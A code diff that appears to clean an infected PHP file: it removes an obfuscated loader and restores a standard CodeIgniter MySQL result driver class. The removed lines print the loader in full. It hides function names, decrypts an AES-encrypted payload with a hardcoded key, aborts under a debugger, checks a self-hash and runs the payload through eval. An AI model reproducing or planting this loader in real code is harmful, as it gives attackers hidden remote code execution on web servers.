@@ -1,28 +1,178 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_nsg7198q=('bas'.'e64'.'_de'.'cod'.'e');
-$_gdjwqozu=('gzu'.'nco'.'mpr'.'ess');
-$_xub5k8pq=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_yz5xakpy='MrkXr62w';
-$_l8zu2iee='IrEcAMwK';
-$_rrbygmoh='ce/Purl2';
-$_bqrt16cf='ePL+32Fqm1E=';
-$_j6376m45='5M6S/fD5';
-$_bt5cj53e='GRbl/Q==';
-$_t5veojus='m3MvgbSe';
-$_ic83blt2='ZHkCrAtg';
-$_er63av96=$_nsg7198q($_j6376m45.$_l8zu2iee.$_yz5xakpy.$_rrbygmoh.$_bqrt16cf);
-$_xwbnq2cf=$_nsg7198q($_t5veojus.$_ic83blt2.$_bt5cj53e);
-$_wdw9lpt7=$_nsg7198q('y4J/pKh8Bk7neERs+MWURC3VdShS8nOrAh6hpFV2ZgrbPruPv3ugnYQ4e2FSzW7sNbC7DRp/UtynhDa13790xlKbOG2Z64yGEN0IIrF305DX7NfUxjfWNnhBF/8+cBHeft2UGUxQZscAsi1aYxkoW4xJ4wREgwVSqpw2e22NDMnMlTUddN21RDmxHzGj7IlLcMLdadYerBGKukR0cv5cgDIBJxV/15bo90UAMzajhHZ8Xeib8nU+KUGSV2/0XKt1Fn/4Hd6ABxp26zx+szXmoRR8upLGuNxfTY6EgidCxKhH41Z/5jAQb1EunXl63AnbYklVtNPqYECp/6soiw+gI9X8QfcgYbor50P+/dtnTU1h9Te/hEu/glOK4sAES6DaqIEuBh8MQXqcd2/TtZBRJWC5Of9spnHDX1vUobjxemj0IWbPwzJdL0rITKBELygWzJqE8XmZwErQZEavTTVsabWZoFdPORvnoFTgs5HywnTkvDzlPmr+mcxvBVd+GvdUSAEiajiO6uk+8YWplfnbBv7+2mPVWmjK0P3jW1CpQK57jtImPfD2JxX8g4iHhGd/EYeWF24dJx+PkdjmlTeiz4QsWqCcBL/LgJ6REruQjcyjBm4sjFl+bfOtbsYRGBhRi4D7H71A4AfEZHEQL+EXojj4NqHlb6dH+W9CVhB4AhJL+Zqam+VUzPB8M2HLwDvGzdm3sihkFg2fDfNd7F855A==');
-$_wnz0drzz=$_xub5k8pq($_wdw9lpt7,'aes-256-cbc',$_er63av96,OPENSSL_RAW_DATA,$_xwbnq2cf);
-if($_wnz0drzz===false){exit;}
-$_xmyzznk1=$_gdjwqozu($_wnz0drzz);
-if($_xmyzznk1===false){exit;}
-$_txak8go7='4849f0c5f3f1292ade443a4a8eacfbc5696eb0e8b938fe1f03d8b2204467bb69';
-$_bgp75idr=@file_get_contents(__FILE__);
-if($_bgp75idr!==false){
-$_vcltvz1m=str_replace($_txak8go7,"0000000000000000000000000000000000000000000000000000000000000000",$_bgp75idr);
-$_zodwhmzm=hash("sha256",$_vcltvz1m);
-if($_zodwhmzm!==$_txak8go7){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_DB_mysql_result extends CI_DB_result {
+
+
+
+
+
+
+public function __construct(&$driver_object)
+{
+parent::__construct($driver_object);
+
+
+$this->num_rows = mysql_num_rows($this->result_id);
 }
-eval($_xmyzznk1);
+
+
+
+
+
+
+public function num_rows()
+{
+return $this->num_rows;
+}
+
+
+
+
+
+
+public function num_fields()
+{
+return mysql_num_fields($this->result_id);
+}
+
+
+
+
+
+
+
+
+public function list_fields()
+{
+$field_names = array();
+mysql_field_seek($this->result_id, 0);
+while ($field = mysql_fetch_field($this->result_id))
+{
+$field_names[] = $field->name;
+}
+return $field_names;
+}
+
+
+
+
+
+
+
+
+public function field_data()
+{
+$retval = array();
+for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = mysql_field_name($this->result_id, $i);
+$retval[$i]->type = mysql_field_type($this->result_id, $i);
+$retval[$i]->max_length = mysql_field_len($this->result_id, $i);
+$retval[$i]->primary_key = (int) (strpos(mysql_field_flags($this->result_id, $i), 'primary_key') !== FALSE);
+}
+return $retval;
+}
+
+
+
+
+
+
+public function free_result()
+{
+if (is_resource($this->result_id))
+{
+mysql_free_result($this->result_id);
+$this->result_id = FALSE;
+}
+}
+
+
+
+
+
+
+
+
+
+
+
+public function data_seek($n = 0)
+{
+return $this->num_rows
+? mysql_data_seek($this->result_id, $n)
+: FALSE;
+}
+
+
+
+
+
+
+
+
+protected function _fetch_assoc()
+{
+return mysql_fetch_assoc($this->result_id);
+}
+
+
+
+
+
+
+
+
+
+protected function _fetch_object($class_name = 'stdClass')
+{
+return mysql_fetch_object($this->result_id, $class_name);
+}
+}
